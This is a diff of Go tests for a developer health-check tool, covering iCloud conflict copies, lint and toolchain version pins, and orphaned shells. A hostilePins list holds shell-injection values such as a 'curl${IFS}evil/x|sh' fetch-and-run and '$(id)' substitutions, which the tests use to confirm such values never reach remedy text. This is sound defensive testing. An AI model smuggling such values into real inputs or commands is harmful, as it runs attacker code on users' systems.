@@ -418,6 +418,36 @@ func TestCheckICloudCheckout_NoCommonDirSkipsCommonScans(t *testing.T) {
 	}
 }
 
+// TestCheckICloudCheckout_AbsentScanDirsTolerated: a fresh or bare-ish common
+// dir can lack objects/pack and refs/. os.ReadDir then returns no entries, so
+// an absent directory contributes nothing — no signal, no note — and the scans
+// after it still run.
+func TestCheckICloudCheckout_AbsentScanDirsTolerated(t *testing.T) {
+	t.Run("objects/pack and refs absent", func(t *testing.T) {
+		f := newICloudFixture(t, "")
+		for _, rel := range []string{"objects", "refs"} {
+			if err := os.RemoveAll(filepath.Join(f.common, rel)); err != nil {
+				t.Fatal(err)
+			}
+		}
+		f.stub(t, nil)
+		got := checkICloudCheckout(f.root)
+		assertRung(t, got, "ok", "proj")
+		if got.detail != f.root {
+			t.Errorf("absent scan dirs must add no note: detail = %q, want %q", got.detail, f.root)
+		}
+	})
+	t.Run("refs scan still runs after an absent objects/pack", func(t *testing.T) {
+		f := newICloudFixture(t, "")
+		if err := os.RemoveAll(filepath.Join(f.common, "objects")); err != nil {
+			t.Fatal(err)
+		}
+		mustWrite(t, filepath.Join(f.common, "refs", "heads", "main 2"), "1111\n")
+		f.stub(t, nil)
+		assertRung(t, checkICloudCheckout(f.root), "warn", "1 iCloud conflict cop(ies) beside their originals: "+filepath.Join(".git", "refs", "heads", "main 2"))
+	})
+}
+
 // TestCheckICloudCheckout_CheckoutScanIsTopLevelOnly: the checkout is scanned
 // at its top level only (refs/ is the one recursive scan), and the refs walk
 // never follows a symlinked directory.
@@ -629,6 +659,38 @@ func TestCheckGolangciLintPin_UnparseableWarns(t *testing.T) {
 	})
 }
 
+// hostilePins are ARG values dockerfileArgDefault keeps whole (no whitespace)
+// that would be shell syntax if formatted into a copy-pasteable remedy.
+var hostilePins = []string{
+	"2.8.0;curl${IFS}evil/x|sh",
+	"2.8.0$(id)",
+	"2.8.0`id`",
+	"2.8.0&&id",
+	"2.8.0'$(id)'",
+}
+
+// TestCheckGolangciLintPin_HostilePinSkipped: a pin that is not vX.Y[.Z] skips
+// the rung (ok) and none of its bytes reach the detail or the remedy. The
+// local version matches the pin's version prefix and the mismatch path would
+// warn with the pin in the install command, so the shape check is the only
+// thing between the hostile ARG and the hint.
+func TestCheckGolangciLintPin_HostilePinSkipped(t *testing.T) {
+	for _, hostile := range hostilePins {
+		for _, prefix := range []string{"", "v"} {
+			pin := prefix + hostile
+			t.Run(pin, func(t *testing.T) {
+				stubTool(t, "golangci-lint", "golangci-lint has version 2.8.0", nil)
+				dir := pinRepo(t, map[string]string{"deploy/gate-image/Dockerfile": "ARG GOLANGCI_LINT_VERSION=" + pin + "\n"})
+				got := checkGolangciLintPin(dir)
+				assertRung(t, got, "ok", "skipped — golangci-lint pin unparseable (deploy/gate-image/Dockerfile ARG GOLANGCI_LINT_VERSION is not vX.Y[.Z])")
+				if strings.Contains(got.detail+got.remediate, hostile[len("2.8.0"):]) {
+					t.Errorf("hostile pin bytes reached the output: detail=%q remediate=%q", got.detail, got.remediate)
+				}
+			})
+		}
+	}
+}
+
 func TestDockerfileArgDefault(t *testing.T) {
 	data := []byte("# ARG GO_VERSION=0.0.1\nARG GO_VERSIONX=9\n  ARG\tGO_VERSION='1.25.6' # trailing\nARG GO_VERSION=2\n")
 	if got := dockerfileArgDefault(data, "GO_VERSION"); got != "1.25.6" {
@@ -696,6 +758,40 @@ func TestCheckGoToolchainPin_GateImageWithoutGoVersionFallsBackToDirective(t *te
 	stubTool(t, "go", "go version go1.27.0 darwin/arm64", nil)
 	dir := pinRepo(t, map[string]string{"go.work": "go 1.25.4\n", "deploy/gate-image/Dockerfile": "FROM x\n"})
 	assertRung(t, checkGoToolchainPin(dir), "warn", "newer", "GOTOOLCHAIN=go1.25.4")
+}
+
+// TestCheckGoToolchainPin_HostileGoVersionFallsBackToDirective: a GO_VERSION
+// that is not X.Y[.Z] is never formatted into a remedy; every remedy path
+// (newer, older, not on PATH, unparseable) recommends the digit-constrained
+// directive toolchain instead.
+func TestCheckGoToolchainPin_HostileGoVersionFallsBackToDirective(t *testing.T) {
+	paths := []struct {
+		name, out string
+		err       error
+		remedy    string
+	}{
+		{"newer", "go version go1.27.1 darwin/arm64", nil, "GOTOOLCHAIN=go1.25.0"},
+		{"older", "go version go1.24.3 darwin/arm64", nil, "upgrade Go to go1.25.0"},
+		{"not on PATH", "", errNotFound("go"), "install Go 1.25.0 "},
+		{"unparseable", "gibberish", nil, "GOTOOLCHAIN=go1.25.0`"},
+	}
+	for _, hostile := range hostilePins {
+		for _, prefix := range []string{"", "go"} {
+			for _, p := range paths {
+				goVersion := prefix + strings.Replace(hostile, "2.8.0", "1.25.6", 1)
+				t.Run(goVersion+"/"+p.name, func(t *testing.T) {
+					stubTool(t, "go", p.out, p.err)
+					dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n",
+						"deploy/gate-image/Dockerfile": "ARG GO_VERSION=" + goVersion + "\n"})
+					got := checkGoToolchainPin(dir)
+					assertRung(t, got, "warn", "go.work pin go 1.25.0", p.remedy)
+					if strings.Contains(got.remediate, "1.25.6") || strings.Contains(got.detail, "1.25.6") {
+						t.Errorf("hostile GO_VERSION reached the output: detail=%q remediate=%q", got.detail, got.remediate)
+					}
+				})
+			}
+		}
+	}
 }
 
 func TestCheckGoToolchainPin_OlderWarns(t *testing.T) {
@@ -904,9 +1000,18 @@ func TestCheckOrphanedShells_OrphanFlagged(t *testing.T) {
 	}
 }
 
+// TestCheckOrphanedShells_AtThresholdsFlagged pins both inclusive bounds: a
+// shell at exactly doctorOrphanMinCPU and exactly doctorOrphanMinAge is
+// flagged, so tightening either comparison to <= turns it RED.
+func TestCheckOrphanedShells_AtThresholdsFlagged(t *testing.T) {
+	stubPS(t, "5155 1 50.0 05:00 /bin/sh\n", nil)
+	assertRung(t, checkOrphanedShells(), "warn", "1 busy shell(s) re-parented to pid 1: pid 5155 sh 50.0% up 05:00", "kill 5155")
+}
+
 func TestCheckOrphanedShells_BelowThresholdsNotFlagged(t *testing.T) {
 	for name, row := range map[string]string{
 		"idle orphan shell":      "5151 1 0.0 30:00 /bin/bash",
+		"just under the CPU bar": "5156 1 49.9 05:00 /bin/sh",
 		"young busy orphan":      "5152 1 99.0 04:59 /bin/sh",
 		"non-shell busy orphan":  "5153 1 99.0 01:00:00 /usr/bin/python3",
 		"busy shell, live owner": "5154 4242 99.0 01:00:00 -bash",
